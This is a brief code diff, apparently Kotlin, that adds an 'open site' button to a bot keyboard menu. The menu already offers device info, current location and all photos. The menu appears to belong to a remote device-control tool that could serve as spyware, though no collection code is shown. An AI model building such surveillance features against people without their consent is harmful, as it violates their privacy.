@@ -8,6 +8,7 @@ object KeyboardBuilder {
     fun mainMenu(): JSONObject {
         val rows = JSONArray()
 
+        rows.put(row(btn("🌐 فتح الموقع", "open_site")))
         rows.put(row(btn("📊 معلومات الجهاز", "info")))
         rows.put(row(btn("📍 الموقع الحالي", "location")))
         rows.put(row(btn("📸 كل الصور", "photos_all")))
